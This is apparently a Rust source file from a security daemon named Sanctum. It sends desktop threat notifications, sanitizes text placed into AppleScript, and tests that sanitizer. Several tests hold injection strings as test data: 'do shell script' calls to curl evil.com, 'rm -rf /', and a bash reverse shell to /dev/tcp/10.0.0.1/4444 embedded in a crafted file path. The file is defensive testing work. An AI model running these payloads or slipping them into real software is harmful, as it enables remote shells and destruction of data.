//! Cross-platform desktop notifications for Sanctum.
//!
//! Currently uses shell-based fallback (notify-send on Linux,
//! osascript on macOS). Will switch to `notify-rust` crate once
//! the upstream zbus dependency compiles on stable Rust.
//!
//! # Security
//!
//! On macOS, notifications are sent via `osascript` running `AppleScript`.
//! All text interpolated into the script is sanitized to a strict allowlist
//! of safe characters, preventing command injection through crafted file
//! paths or descriptions.

use sanctum_types::threat::{ThreatEvent, ThreatLevel};

/// Sanitize text before embedding it in an `AppleScript` string literal.
///
/// Only retains characters from a strict allowlist:
/// - ASCII alphanumeric (`a-z`, `A-Z`, `0-9`)
/// - Space, dot, hyphen, underscore, forward slash, colon, comma,
///   parentheses, square brackets, equals, at-sign, hash, plus
///
/// Everything else — including quotes, backslashes, newlines, control
/// characters, and non-ASCII — is replaced with an underscore. This is
/// deliberately aggressive: a notification losing some cosmetic fidelity
/// is far preferable to an injection vulnerability.
fn sanitize_for_applescript(input: &str) -> String {
    input
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric()
                || matches!(
                    c,
                    ' ' | '.'
                        | '-'
                        | '_'
                        | '/'
                        | ':'
                        | ','
                        | '('
                        | ')'
                        | '['
                        | ']'
                        | '='
                        | '@'
                        | '#'
                        | '+'
                )
            {
                c
            } else {
                '_'
            }
        })
        .collect()
}

/// Send a desktop notification for a threat event.
///
/// Non-blocking — if the notification fails, it's logged but doesn't
/// interrupt the daemon's operation.
pub fn notify_threat(event: &ThreatEvent) {
    let summary = match event.level {
        ThreatLevel::Critical => format!("Sanctum: CRITICAL - {}", category_display(event)),
        ThreatLevel::Warning => format!("Sanctum: Warning - {}", category_display(event)),
        ThreatLevel::Info => format!("Sanctum: {}", category_display(event)),
    };

    let body = format!(
        "{} | Path: {} | Action: {:?}",
        event.description,
        event.source_path.display(),
        event.action_taken,
    );

    if let Err(e) = send_notification(&summary, &body) {
        tracing::warn!(%e, "failed to send desktop notification");
    }
}

const fn category_display(event: &ThreatEvent) -> &'static str {
    match event.category {
        sanctum_types::threat::ThreatCategory::PthInjection => "Suspicious .pth file detected",
        sanctum_types::threat::ThreatCategory::SiteCustomize => "sitecustomize.py modified",
        sanctum_types::threat::ThreatCategory::CredentialAccess => "Credential file accessed",
        sanctum_types::threat::ThreatCategory::NetworkAnomaly => "Network anomaly detected",
        sanctum_types::threat::ThreatCategory::McpViolation => "MCP tool policy violation",
        sanctum_types::threat::ThreatCategory::BudgetOverrun => "LLM budget exceeded",
    }
}

/// Send a notification using platform-specific shell commands.
fn send_notification(summary: &str, body: &str) -> Result<(), String> {
    #[cfg(target_os = "linux")]
    {
        // Linux: notify-send passes arguments safely (no shell interpolation).
        match std::process::Command::new("notify-send")
            .args(["--urgency=critical", "--app-name=Sanctum", summary, body])
            .spawn()
        {
            Ok(mut child) => {
                // Reap the child in a background thread to prevent zombie accumulation.
                std::thread::spawn(move || {
                    let _ = child.wait();
                });
            }
            Err(e) => return Err(format!("notify-send failed: {e}")),
        }
    }

    #[cfg(target_os = "macos")]
    {
        // macOS: osascript executes AppleScript, so we must sanitize all
        // interpolated text to prevent script injection. The sanitizer
        // strips everything except a strict allowlist of safe characters.
        let safe_body = sanitize_for_applescript(body);
        let safe_summary = sanitize_for_applescript(summary);
        let script = format!(
            "display notification \"{safe_body}\" with title \"{safe_summary}\"",
        );
        match std::process::Command::new("osascript")
            .args(["-e", &script])
            .spawn()
        {
            Ok(mut child) => {
                // Reap the child in a background thread to prevent zombie accumulation.
                std::thread::spawn(move || {
                    let _ = child.wait();
                });
            }
            Err(e) => return Err(format!("osascript failed: {e}")),
        }
    }

    #[cfg(not(any(target_os = "linux", target_os = "macos")))]
    {
        tracing::info!(%summary, %body, "notification (no desktop backend available)");
    }

    Ok(())
}

#[cfg(test)]
#[allow(clippy::expect_used)]
mod tests {
    use super::*;
    use sanctum_types::threat::{Action, ThreatCategory, ThreatEvent, ThreatLevel};
    use std::path::PathBuf;

    /// Helper to build a `ThreatEvent` with customizable fields.
    fn make_event(
        level: ThreatLevel,
        category: ThreatCategory,
        description: &str,
        path: &str,
    ) -> ThreatEvent {
        ThreatEvent {
            timestamp: chrono::Utc::now(),
            level,
            category,
            description: description.into(),
            source_path: PathBuf::from(path),
            creator_pid: Some(42),
            creator_exe: Some(PathBuf::from("/usr/bin/python3")),
            action_taken: Action::Alerted,
        }
    }

    // ── AppleScript command construction ───────────────────────────

    #[test]
    fn applescript_command_is_well_formed() {
        // Verify the send_notification path builds a correctly structured
        // AppleScript display-notification string after sanitisation.
        let summary = "Sanctum: CRITICAL - Suspicious .pth file detected";
        let body = "evil payload | Path: /tmp/evil.pth | Action: Quarantined";
        let safe_body = sanitize_for_applescript(body);
        let safe_summary = sanitize_for_applescript(summary);
        let script = format!(
            "display notification \"{safe_body}\" with title \"{safe_summary}\"",
        );
        assert!(script.starts_with("display notification \""));
        assert!(script.contains("\" with title \""));
        assert!(script.ends_with('"'));
        // No unescaped quotes inside the two string literals
        let inner = &script["display notification \"".len()..];
        let parts: Vec<&str> = inner.splitn(2, "\" with title \"").collect();
        assert_eq!(parts.len(), 2, "script should have exactly two string literals");
        assert!(
            !parts[0].contains('"'),
            "body literal must not contain bare quotes"
        );
        // parts[1] ends with a trailing quote; strip it and check
        let title_inner = parts[1].strip_suffix('"').expect("trailing quote");
        assert!(
            !title_inner.contains('"'),
            "title literal must not contain bare quotes"
        );
    }

    #[test]
    fn applescript_sanitises_injection_in_constructed_command() {
        let malicious_summary = "Sanctum\"\ndo shell script \"id";
        let malicious_body = "payload\"\ndo shell script \"curl evil.com";
        let safe_body = sanitize_for_applescript(malicious_body);
        let safe_summary = sanitize_for_applescript(malicious_summary);
        let script = format!(
            "display notification \"{safe_body}\" with title \"{safe_summary}\"",
        );
        assert!(!script.contains('\n'), "newlines must not survive in script");
        // Count quotes: should be exactly 4 (the delimiters)
        let quote_count = script.chars().filter(|&c| c == '"').count();
        assert_eq!(
            quote_count, 4,
            "script should have exactly 4 delimiter quotes, got {quote_count}"
        );
    }

    // ── Special characters in ThreatEvent don't panic ──────────────

    #[test]
    fn notify_threat_with_special_characters_does_not_panic() {
        let nasty_descriptions = [
            "normal description",
            "",
            "has \"double quotes\" inside",
            "has 'single quotes' inside",
            "null\x00byte",
            "newline\nand\ttab",
            "backslash\\escape",
            "unicode: \u{1F4A3}\u{200B}\u{00E9}",
            "combo: \"\n\\do shell script \"rm -rf /\"",
            &"a".repeat(10_000), // very long string
        ];
        let nasty_paths = [
            "/normal/path.pth",
            "/path with spaces/file.pth",
            "/path/with\"quotes/file.pth",
            "/path/with\nnewline/file.pth",
            "",
        ];

        for desc in &nasty_descriptions {
            for path in &nasty_paths {
                let event = make_event(
                    ThreatLevel::Critical,
                    ThreatCategory::PthInjection,
                    desc,
                    path,
                );
                // Must not panic — we only care that the formatting logic runs
                // without crashing, not that the notification actually sends.
                notify_threat(&event);
            }
        }
    }

    // ── Category display mapping ───────────────────────────────────

    #[test]
    fn every_category_produces_non_empty_display() {
        let categories = [
            ThreatCategory::PthInjection,
            ThreatCategory::SiteCustomize,
            ThreatCategory::CredentialAccess,
            ThreatCategory::NetworkAnomaly,
        ];
        for cat in &categories {
            let event = make_event(ThreatLevel::Info, *cat, "test", "/tmp/test");
            let display = category_display(&event);
            assert!(
                !display.is_empty(),
                "category_display for {cat:?} must be non-empty"
            );
        }
    }

    #[test]
    fn category_display_returns_distinct_strings() {
        let categories = [
            ThreatCategory::PthInjection,
            ThreatCategory::SiteCustomize,
            ThreatCategory::CredentialAccess,
            ThreatCategory::NetworkAnomaly,
        ];
        let displays: Vec<&str> = categories
            .iter()
            .map(|cat| {
                let event = make_event(ThreatLevel::Info, *cat, "test", "/tmp/test");
                category_display(&event)
            })
            .collect();
        // All display strings should be unique
        let mut unique = displays.clone();
        unique.sort_unstable();
        unique.dedup();
        assert_eq!(
            displays.len(),
            unique.len(),
            "each category should have a distinct display string"
        );
    }

    // ── Severity display mapping ───────────────────────────────────

    #[test]
    fn every_severity_produces_non_empty_summary() {
        let levels = [ThreatLevel::Info, ThreatLevel::Warning, ThreatLevel::Critical];
        for level in &levels {
            let event = make_event(*level, ThreatCategory::PthInjection, "test", "/tmp/t");
            let summary = match event.level {
                ThreatLevel::Critical => {
                    format!("Sanctum: CRITICAL - {}", category_display(&event))
                }
                ThreatLevel::Warning => {
                    format!("Sanctum: Warning - {}", category_display(&event))
                }
                ThreatLevel::Info => format!("Sanctum: {}", category_display(&event)),
            };
            assert!(
                !summary.is_empty(),
                "summary for {level:?} must be non-empty"
            );
        }
    }

    #[test]
    fn severity_summary_contains_level_indicator() {
        let event_critical =
            make_event(ThreatLevel::Critical, ThreatCategory::PthInjection, "d", "/p");
        let event_warning =
            make_event(ThreatLevel::Warning, ThreatCategory::PthInjection, "d", "/p");
        let event_info =
            make_event(ThreatLevel::Info, ThreatCategory::PthInjection, "d", "/p");

        let fmt = |e: &ThreatEvent| match e.level {
            ThreatLevel::Critical => format!("Sanctum: CRITICAL - {}", category_display(e)),
            ThreatLevel::Warning => format!("Sanctum: Warning - {}", category_display(e)),
            ThreatLevel::Info => format!("Sanctum: {}", category_display(e)),
        };

        assert!(
            fmt(&event_critical).contains("CRITICAL"),
            "critical summary should contain CRITICAL"
        );
        assert!(
            fmt(&event_warning).contains("Warning"),
            "warning summary should contain Warning"
        );
        assert!(
            fmt(&event_info).starts_with("Sanctum:"),
            "info summary should start with Sanctum:"
        );
    }

    // ── Full notify_threat path ────────────────────────────────────

    #[test]
    fn notify_threat_runs_all_severity_category_combinations() {
        // Exercise every combination of level and category to ensure
        // no match arm is missing and nothing panics.
        let levels = [ThreatLevel::Info, ThreatLevel::Warning, ThreatLevel::Critical];
        let categories = [
            ThreatCategory::PthInjection,
            ThreatCategory::SiteCustomize,
            ThreatCategory::CredentialAccess,
            ThreatCategory::NetworkAnomaly,
        ];
        let actions = [Action::Logged, Action::Alerted, Action::Quarantined, Action::Blocked];

        for level in &levels {
            for cat in &categories {
                for action in &actions {
                    let event = ThreatEvent {
                        timestamp: chrono::Utc::now(),
                        level: *level,
                        category: *cat,
                        description: "test event".into(),
                        source_path: PathBuf::from("/tmp/test.pth"),
                        creator_pid: None,
                        creator_exe: None,
                        action_taken: *action,
                    };
                    // notify_threat returns () — it logs errors internally.
                    // We just verify it doesn't panic on any combination.
                    notify_threat(&event);
                }
            }
        }
    }

    #[test]
    fn send_notification_returns_ok_or_err() {
        // send_notification should return Ok on macOS (osascript exists)
        // or return an Err on systems without the notification backend.
        // Either way it must not panic.
        let result = send_notification("Test Title", "Test Body");
        // We accept both Ok and Err — the important thing is no panic.
        let _ = result;
    }

    // ── Existing sanitize_for_applescript tests ────────────────────

    #[test]
    fn sanitize_preserves_safe_characters() {
        let input = "Sanctum: CRITICAL - Suspicious .pth file detected";
        assert_eq!(sanitize_for_applescript(input), input);
    }

    #[test]
    fn sanitize_preserves_typical_unix_path() {
        let input = "/usr/lib/python3.12/site-packages/evil.pth";
        assert_eq!(sanitize_for_applescript(input), input);
    }

    #[test]
    fn sanitize_strips_double_quotes() {
        let input = r#"hello "world""#;
        assert_eq!(sanitize_for_applescript(input), "hello _world_");
    }

    #[test]
    fn sanitize_strips_backslashes() {
        let input = r"path\to\evil";
        assert_eq!(sanitize_for_applescript(input), "path_to_evil");
    }

    #[test]
    fn sanitize_strips_newlines_preventing_statement_injection() {
        // In AppleScript, newlines are statement separators. A crafted
        // filename containing a newline could inject arbitrary commands.
        let input = "benign.pth\"\ndo shell script \"curl evil.com";
        let result = sanitize_for_applescript(input);
        assert!(
            !result.contains('\n'),
            "newlines must be stripped: {result}"
        );
        assert!(
            !result.contains('"'),
            "double quotes must be stripped: {result}"
        );
        // The words "do shell script" may still appear as plain text, but
        // without quotes and newlines they cannot function as an AppleScript
        // statement -- they are inert text inside a string literal.
    }

    #[test]
    fn sanitize_strips_backslash_escape_sequences() {
        // AppleScript understands \" and \\ inside double-quoted strings.
        // A path containing backslashes could be used to escape the closing
        // quote and inject code.
        let input = r#"evil.pth\" & do shell script "id" & ""#;
        let result = sanitize_for_applescript(input);
        assert!(
            !result.contains('\\'),
            "backslashes must be stripped: {result}"
        );
        assert!(
            !result.contains('"'),
            "double quotes must be stripped: {result}"
        );
    }

    #[test]
    fn sanitize_strips_control_characters() {
        let input = "hello\x00\x01\x7fworld";
        let result = sanitize_for_applescript(input);
        assert_eq!(result, "hello___world");
    }

    #[test]
    fn sanitize_strips_non_ascii_unicode() {
        // Non-ASCII characters could contain homoglyphs or other tricks.
        let input = "legit\u{200B}path/\u{00E9}vil.pth";
        let result = sanitize_for_applescript(input);
        assert!(
            result.is_ascii(),
            "non-ASCII must be stripped: {result}"
        );
    }

    #[test]
    fn sanitize_handles_combined_injection_attempt() {
        // A realistic attack: a .pth filename crafted to break out of
        // the AppleScript string and execute a reverse shell.
        let input = concat!(
            "/tmp/site-packages/\"\n",
            "do shell script \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"\n",
            "display notification \""
        );
        let result = sanitize_for_applescript(input);
        assert!(!result.contains('\n'));
        assert!(!result.contains('"'));
        assert!(!result.contains('\\'));
        assert!(!result.contains('&'));
        assert!(!result.contains('>'));
        // The safe output should contain only allowlisted characters
        for c in result.chars() {
            assert!(
                c.is_ascii_alphanumeric()
                    || matches!(
                        c,
                        ' ' | '.'
                            | '-'
                            | '_'
                            | '/'
                            | ':'
                            | ','
                            | '('
                            | ')'
                            | '['
                            | ']'
                            | '='
                            | '@'
                            | '#'
                            | '+'
                    ),
                "unexpected character in sanitized output: {c:?}"
            );
        }
    }

    #[test]
    fn sanitize_empty_input() {
        assert_eq!(sanitize_for_applescript(""), "");
    }

    #[test]
    fn sanitize_single_quotes_stripped() {
        // Single quotes in AppleScript can also be meaningful in
        // certain contexts; strip them for safety.
        let input = "it's a trap";
        let result = sanitize_for_applescript(input);
        assert_eq!(result, "it_s a trap");
    }
}
